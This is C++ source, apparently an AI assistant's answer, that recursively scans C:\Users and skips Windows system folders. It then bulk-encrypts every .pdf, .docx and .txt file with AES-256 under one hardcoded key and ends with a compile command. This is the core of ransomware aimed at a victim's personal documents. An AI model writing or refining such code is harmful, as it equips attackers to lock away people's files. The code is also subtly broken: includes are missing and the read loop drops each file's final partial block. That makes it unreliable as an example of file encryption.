#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <algorithm>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/err.h>

class FileProcessor {
public:
    // Find files by extension
    static std::vector<std::string> findFilesByExtension(
        const std::string& rootPath, 
        const std::vector<std::string>& extensions, 
        bool excludeSystemDirs = true
    ) {
        std::vector<std::string> matchedFiles;
        std::vector<std::string> normalizedExtensions;

        for (const auto& ext : extensions) {
            normalizedExtensions.push_back(toLowercase(ext));
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath, 
                std::filesystem::directory_options::skip_permission_denied)) {
                
                if (excludeSystemDirs && isSystemPath(entry.path().string())) {
                    continue;
                }

                if (entry.is_regular_file()) {
                    std::string extension = toLowercase(entry.path().extension().string());
                    
                    if (std::find(normalizedExtensions.begin(), 
                                  normalizedExtensions.end(), 
                                  extension) != normalizedExtensions.end()) {
                        matchedFiles.push_back(entry.path().string());
                    }
                }
            }
        }
        catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "Error accessing filesystem: " << e.what() << std::endl;
        }

        return matchedFiles;
    }

    // AES-256 File Encryption
    static bool encryptFile(const std::string& inputFile, const std::string& key) {
        if (key.length() != 32) {
            std::cerr << "Invalid key length. Must be 32 bytes." << std::endl;
            return false;
        }

        std::string outputFile = inputFile + ".encrypted";

        OpenSSL_add_all_algorithms();

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            std::cerr << "Error creating cipher context" << std::endl;
            return false;
        }

        unsigned char iv[AES_BLOCK_SIZE];
        RAND_bytes(iv, AES_BLOCK_SIZE);

        if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
            reinterpret_cast<const unsigned char*>(key.c_str()), iv)) {
            std::cerr << "Encryption initialization failed" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        std::ifstream inFile(inputFile, std::ios::binary);
        std::ofstream outFile(outputFile, std::ios::binary);

        if (!inFile || !outFile) {
            std::cerr << "File open error" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        outFile.write(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE);

        const int bufferSize = 4096;
        unsigned char inBuffer[bufferSize];
        unsigned char outBuffer[bufferSize + AES_BLOCK_SIZE];
        int outLen;

        while (inFile.read(reinterpret_cast<char*>(inBuffer), bufferSize)) {
            if (1 != EVP_EncryptUpdate(ctx, outBuffer, &outLen, inBuffer, inFile.gcount())) {
                std::cerr << "Encryption update failed" << std::endl;
                EVP_CIPHER_CTX_free(ctx);
                return false;
            }
            outFile.write(reinterpret_cast<char*>(outBuffer), outLen);
        }

        if (1 != EVP_EncryptFinal_ex(ctx, outBuffer, &outLen)) {
            std::cerr << "Encryption finalization failed" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        outFile.write(reinterpret_cast<char*>(outBuffer), outLen);

        EVP_CIPHER_CTX_free(ctx);
        inFile.close();
        outFile.close();

        std::cout << "File encrypted: " << outputFile << std::endl;
        return true;
    }

    // Bulk encryption of files
    static void encryptFiles(const std::vector<std::string>& files, const std::string& key) {
        for (const auto& file : files) {
            encryptFile(file, key);
        }
    }

private:
    static std::string toLowercase(const std::string& str) {
        std::string lowered = str;
        std::transform(lowered.begin(), lowered.end(), lowered.begin(), 
            [](unsigned char c){ return std::tolower(c); });
        return lowered;
    }

    static bool isSystemPath(const std::string& path) {
        std::vector<std::string> systemDirs = {
            "\\windows", "\\program files", "\\program files (x86)", 
            "\\system volume information", "\\$recycle.bin"
        };

        std::string lowercasePath = toLowercase(path);
        
        for (const auto& sysDir : systemDirs) {
            if (lowercasePath.find(toLowercase(sysDir)) != std::string::npos) {
                return true;
            }
        }
        return false;
    }
};

int main() {
    // Search path
    std::string searchPath = "C:\\Users";

    // File extensions to encrypt 
    std::vector<std::string> extensions = {".pdf", ".docx", ".txt"};

    // Encryption key (must be 32 bytes)
    std::string encryptionKey = "01234567890123456789012345678901";

    // Find files
    std::vector<std::string> foundFiles = FileProcessor::findFilesByExtension(searchPath, extensions);

    // Encrypt found files
    FileProcessor::encryptFiles(foundFiles, encryptionKey);

    return 0;
}
```

Key Enhancements:
- Unified `FileProcessor` class
- Added bulk encryption method
- Single key for all files
- Integrated file search and encryption
- Configurable search path and extensions

Compilation requires OpenSSL: 
```bash
g++ -std=c++17 file_encryption.cpp -lcrypto -lssl
```
